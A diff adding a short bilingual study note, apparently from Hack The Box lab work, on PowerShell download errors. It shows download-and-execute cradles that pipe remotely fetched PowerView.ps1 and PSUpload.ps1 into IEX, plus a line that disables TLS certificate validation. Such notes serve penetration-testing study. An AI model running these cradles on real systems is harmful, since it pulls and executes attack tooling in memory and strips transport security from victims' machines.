@@ -1,0 +1,32 @@
+Các lỗi thường gặp trong Powershell 
+
+
+Internet Explorer
+  There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
+  This can be bypassed using the parameter -UseBasicParsing.
+
+  Example : PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
+          => trả về lỗi 
+    Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
+    At line:1 char:1
+    + Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+    + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+  Example OK hơn : PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+          => mượt ý chứ 
+
+Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
+
+Example : PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+          => lỗi 
+      Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
+      relationship for the SSL/TLS secure channel."
+      At line:1 char:1
+      + IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+      + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+          + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+          + FullyQualifiedErrorId : WebException
+PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+          => mượt ý chứ 
